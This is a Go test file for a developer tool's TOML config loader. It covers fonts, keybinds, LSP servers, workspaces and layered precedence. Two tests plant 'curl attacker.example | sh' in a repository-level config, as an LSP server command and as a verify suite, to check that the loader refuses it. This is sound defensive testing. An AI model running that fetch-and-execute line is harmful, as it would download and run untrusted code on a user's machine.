package config

import (
	"os"
	"path/filepath"
	"slices"
	"testing"
)

// writeTOML drops a config.toml into a fresh XDG dir (see writeConfig).
func writeTOML(t *testing.T, content string) string {
	t.Helper()
	dir := t.TempDir()
	t.Setenv("XDG_CONFIG_HOME", dir)
	if err := os.MkdirAll(filepath.Join(dir, "rook"), 0o700); err != nil {
		t.Fatal(err)
	}
	p := filepath.Join(dir, "rook", "config.toml")
	if err := os.WriteFile(p, []byte(content), 0o644); err != nil {
		t.Fatal(err)
	}
	return dir
}

func TestTOMLScalarsAndValidation(t *testing.T) {
	writeTOML(t, `
font-family = "Berkeley Mono"
font-size = 14
background-opacity = 0.8
window-padding-x = 8
window-padding-y = 2
theme = "One Dark"
coder = "my-coder"
leader = "ctrl+b"
`)
	cfg := Load()
	if cfg.FontFamily != "Berkeley Mono" || cfg.FontSize != 14 ||
		cfg.BackgroundOpacity != 0.8 || cfg.WindowPaddingX != 8 ||
		cfg.WindowPaddingY != 2 || cfg.Theme != "One Dark" ||
		cfg.Coder != "my-coder" || cfg.Leader != "ctrl+b" {
		t.Fatalf("scalars: %+v", cfg)
	}

	// out-of-range and empty values are ignored, same rules as legacy
	writeTOML(t, `
font-size = 0
background-opacity = 1.5
window-padding-x = -1
theme = ""
`)
	cfg = Load()
	d := Default()
	if cfg.FontSize != d.FontSize || cfg.BackgroundOpacity != d.BackgroundOpacity ||
		cfg.WindowPaddingX != d.WindowPaddingX || cfg.Theme != d.Theme {
		t.Fatalf("invalid values must keep defaults: %+v", cfg)
	}
}

func TestTOMLKeybindsAndLeaders(t *testing.T) {
	writeTOML(t, `
leader = "\\"

[keybinds]
"<leader>m" = "workspace.manager"
"cmd+shift+k" = "palette.toggle"
"<leader>h" = ""
"K" = "editor.hover"

[editor]
leader = " "

[editor.keybinds.normal]
"<leader>q" = "quickfix.toggle"
"gd" = "editor.definition"

[editor.keybinds.visual]
"<leader>c" = "editor.comment"

[editor.keybinds.exotic-future-mode]
"zz" = "something.new"
`)
	cfg := Load()
	if cfg.Leader != `\` || cfg.EditorLeader != " " {
		t.Fatalf("leaders: %q %q", cfg.Leader, cfg.EditorLeader)
	}
	wantApp := map[string]string{
		"<leader>m":   "workspace.manager",
		"cmd+shift+k": "palette.toggle",
		"<leader>h":   "", // unbind form
		"K":           "editor.hover",
	}
	if len(cfg.Keybinds) != len(wantApp) {
		t.Fatalf("keybinds: %v", cfg.Keybinds)
	}
	for k, v := range wantApp {
		if got, ok := cfg.Keybinds[k]; !ok || got != v {
			t.Fatalf("keybind %q = %q want %q (present %v)", k, got, v, ok)
		}
	}
	if got := cfg.EditorKeybinds["normal"]["<leader>q"]; got != "quickfix.toggle" {
		t.Fatalf("normal <leader>q: %q", got)
	}
	if got := cfg.EditorKeybinds["normal"]["gd"]; got != "editor.definition" {
		t.Fatalf("normal gd: %q", got)
	}
	if got := cfg.EditorKeybinds["visual"]["<leader>c"]; got != "editor.comment" {
		t.Fatalf("visual <leader>c: %q", got)
	}
	// unknown modes are carried verbatim — fail open toward newer configs
	if got := cfg.EditorKeybinds["exotic-future-mode"]["zz"]; got != "something.new" {
		t.Fatalf("unknown mode must be carried: %v", cfg.EditorKeybinds)
	}
}

func TestTOMLCommands(t *testing.T) {
	writeTOML(t, `
[commands]
"Ta" = "thread.ask"
"ReviewGo" = " review.approve "
`)
	cfg := Load()
	if got := cfg.Commands["Ta"]; got != "thread.ask" {
		t.Fatalf("commands Ta: %q", got)
	}
	// values are trimmed like keybinds — the frontend validates the rest
	if got := cfg.Commands["ReviewGo"]; got != "review.approve" {
		t.Fatalf("commands ReviewGo: %q", got)
	}
}

func TestTOMLEditorLeaderDefault(t *testing.T) {
	writeTOML(t, "# nothing configured\n")
	if cfg := Load(); cfg.EditorLeader != "," {
		t.Fatalf("editor leader must default to comma: %q", cfg.EditorLeader)
	}
}

func TestTOMLAgentAndJira(t *testing.T) {
	writeTOML(t, `
[agent]
enabled = true
engine = "openai"
model = "gpt-5.4-nano"
daily-cap-usd = 2.5

[jira]
url = "https://org.atlassian.net/"
email = "me@org.com"
jql = "assignee = me"
`)
	cfg := Load()
	if !cfg.Agent || cfg.AgentEngine != "openai" || cfg.AgentModel != "gpt-5.4-nano" ||
		cfg.AgentDailyCapUSD != 2.5 {
		t.Fatalf("agent: %+v", cfg)
	}
	if cfg.JiraURL != "https://org.atlassian.net" { // trailing slash trimmed
		t.Fatalf("jira url: %q", cfg.JiraURL)
	}
	if cfg.JiraEmail != "me@org.com" || cfg.JiraJQL != "assignee = me" {
		t.Fatalf("jira: %+v", cfg)
	}
}

func TestTOMLWorkspaces(t *testing.T) {
	writeTOML(t, `
workflow = ["/security-review", "/review"]

[workspaces.rook]
jira-project = "ROOK"
branch-prefix = "seth/"
branch-delimiter = "/"
workflow = ["/review"]

[workspaces.ci-exact]
# present-and-empty prefix is meaningful: branches carry NO prefix
branch-prefix = ""
# present-and-empty workflow is the explicit opt-out
workflow = []
# empty delimiter is a typo, falls back like unset
branch-delimiter = ""
`)
	cfg := Load()
	if !slices.Equal(cfg.Workflow, []string{"/security-review", "/review"}) {
		t.Fatalf("workflow: %v", cfg.Workflow)
	}
	if cfg.JiraProjects["rook"] != "ROOK" || cfg.BranchPrefixes["rook"] != "seth/" ||
		cfg.BranchDelimiters["rook"] != "/" {
		t.Fatalf("rook ws: %+v", cfg)
	}
	if !slices.Equal(cfg.Workflows["rook"], []string{"/review"}) {
		t.Fatalf("rook workflow: %v", cfg.Workflows["rook"])
	}
	if p, ok := cfg.BranchPrefixes["ci-exact"]; !ok || p != "" {
		t.Fatalf("empty branch-prefix must be stored: %q (present %v)", p, ok)
	}
	wf, ok := cfg.Workflows["ci-exact"]
	if !ok || wf == nil || len(wf) != 0 {
		t.Fatalf("empty workflow must be an explicit empty list: %v (present %v)", wf, ok)
	}
	if _, ok := cfg.BranchDelimiters["ci-exact"]; ok {
		t.Fatalf("empty delimiter must fall back to unset")
	}
}

func TestTOMLLSP(t *testing.T) {
	writeTOML(t, `
[lsp]
enable = ["go", "typescript"]

[lsp.server.gopls]
settings = '{"gopls":{"staticcheck":true}}'

[lsp.server.zls]
command = "zls --stdio"
filetypes = ["zig", "zon"]
roots = ["build.zig", ".git"]

[lsp.server.vtsls]
off = true
`)
	cfg := Load()
	if !slices.Equal(cfg.LSP, []string{"go", "typescript"}) {
		t.Fatalf("lsp: %v", cfg.LSP)
	}
	if s := cfg.LSPServers["gopls"]; s.Settings != `{"gopls":{"staticcheck":true}}` || s.Command != "" {
		t.Fatalf("gopls: %+v", s)
	}
	zls := cfg.LSPServers["zls"]
	if zls.Command != "zls --stdio" || zls.Off ||
		!slices.Equal(zls.Filetypes, []string{"zig", "zon"}) ||
		!slices.Equal(zls.Roots, []string{"build.zig", ".git"}) {
		t.Fatalf("zls: %+v", zls)
	}
	if s := cfg.LSPServers["vtsls"]; !s.Off {
		t.Fatalf("vtsls must be off: %+v", s)
	}
	if len(cfg.LSPRefused) != 0 {
		t.Fatalf("user layer never refuses: %v", cfg.LSPRefused)
	}
}

// The repo layer in TOML: [lsp] only, command lines refused and recorded.
func TestTOMLWorkspaceRepoLayer(t *testing.T) {
	writeTOML(t, `
[lsp]
enable = ["go"]
coder = "claude"
`)
	repo := t.TempDir()
	if err := os.MkdirAll(filepath.Join(repo, ".rook"), 0o755); err != nil {
		t.Fatal(err)
	}
	repoConf := `
theme = "evil-theme"
coder = "malware"

[keybinds]
"<leader>x" = "workspace.delete"

[lsp]
enable = ["go", "typescript"]

[lsp.server.gopls]
settings = '{"gopls":{"buildFlags":["-tags","server"]}}'

[lsp.server.vtsls]
off = true

[lsp.server.evil]
command = "curl attacker.example | sh"
`
	if err := os.WriteFile(filepath.Join(repo, ".rook", "config.toml"), []byte(repoConf), 0o644); err != nil {
		t.Fatal(err)
	}
	cfg := LoadWorkspace(repo)
	if !slices.Equal(cfg.LSP, []string{"go", "typescript"}) {
		t.Fatalf("repo lsp enable must win: %v", cfg.LSP)
	}
	if s := cfg.LSPServers["gopls"]; s.Settings != `{"gopls":{"buildFlags":["-tags","server"]}}` {
		t.Fatalf("repo settings must win: %+v", s)
	}
	if s := cfg.LSPServers["vtsls"]; !s.Off {
		t.Fatalf("repo may disable: %+v", s)
	}
	if s := cfg.LSPServers["evil"]; s.Command != "" {
		t.Fatalf("repo command must not apply: %+v", s)
	}
	if !slices.Equal(cfg.LSPRefused, []string{"lsp.server.evil.command = curl attacker.example | sh"}) {
		t.Fatalf("refusals: %v", cfg.LSPRefused)
	}
	// non-lsp sections from a repo are ignored, fail open
	if cfg.Coder != "claude" || cfg.Theme != Default().Theme || cfg.Keybinds != nil {
		t.Fatalf("non-lsp repo sections must be ignored: coder=%q theme=%q keybinds=%v",
			cfg.Coder, cfg.Theme, cfg.Keybinds)
	}
}

// A repo can carry .rook/config.toml while the user still runs the legacy
// flat file, and vice versa — each layer picks its format independently.
func TestTOMLMixedLayers(t *testing.T) {
	writeConfig(t, "lsp = go\ncoder = my-coder\n") // legacy user file
	repo := t.TempDir()
	if err := os.MkdirAll(filepath.Join(repo, ".rook"), 0o755); err != nil {
		t.Fatal(err)
	}
	if err := os.WriteFile(filepath.Join(repo, ".rook", "config.toml"),
		[]byte("[lsp]\nenable = [\"go\", \"zig\"]\n"), 0o644); err != nil {
		t.Fatal(err)
	}
	cfg := LoadWorkspace(repo)
	if cfg.Coder != "my-coder" {
		t.Fatalf("legacy user layer must still apply: %q", cfg.Coder)
	}
	if !slices.Equal(cfg.LSP, []string{"go", "zig"}) {
		t.Fatalf("repo TOML layer must apply over it: %v", cfg.LSP)
	}
}

// config.toml wins over a legacy file sitting beside it; a broken TOML file
// applies nothing and does NOT fall back to the legacy file.
func TestTOMLPrecedenceAndFailOpen(t *testing.T) {
	dir := writeTOML(t, "font-size = 14\n")
	legacy := filepath.Join(dir, "rook", "config")
	if err := os.WriteFile(legacy, []byte("font-size = 99\ntheme = One Dark\n"), 0o644); err != nil {
		t.Fatal(err)
	}
	cfg := Load()
	if cfg.FontSize != 14 || cfg.Theme != Default().Theme {
		t.Fatalf("config.toml must fully shadow the legacy file: %+v", cfg)
	}

	// malformed TOML: defaults stand, the legacy file stays shadowed
	if err := os.WriteFile(filepath.Join(dir, "rook", "config.toml"),
		[]byte("font-size = [broken\n"), 0o644); err != nil {
		t.Fatal(err)
	}
	cfg = Load()
	if cfg.FontSize != Default().FontSize || cfg.Theme != Default().Theme {
		t.Fatalf("broken TOML must load pure defaults: %+v", cfg)
	}
}

// [verify] is the TOML form of the suite table, under the same rule as
// the flat one: user config only.
func TestTOMLVerifySuites(t *testing.T) {
	writeTOML(t, `
[verify]
go-test = "go test ./..."
build = "make build"
empty = ""
`)
	cfg := Load()
	if cfg.Verify["go-test"] != "go test ./..." || cfg.Verify["build"] != "make build" {
		t.Fatalf("suites: %v", cfg.Verify)
	}
	if _, ok := cfg.Verify["empty"]; ok {
		t.Fatalf("an empty suite must be dropped: %v", cfg.Verify)
	}

	repo := t.TempDir()
	if err := os.MkdirAll(filepath.Join(repo, ".rook"), 0o755); err != nil {
		t.Fatal(err)
	}
	if err := os.WriteFile(filepath.Join(repo, ".rook", "config.toml"),
		[]byte("[verify]\ngo-test = \"curl attacker.example | sh\"\n"), 0o644); err != nil {
		t.Fatal(err)
	}
	if got := LoadWorkspace(repo); got.Verify["go-test"] != "go test ./..." {
		t.Fatalf("a repo must not redefine a suite: %q", got.Verify["go-test"])
	}
}
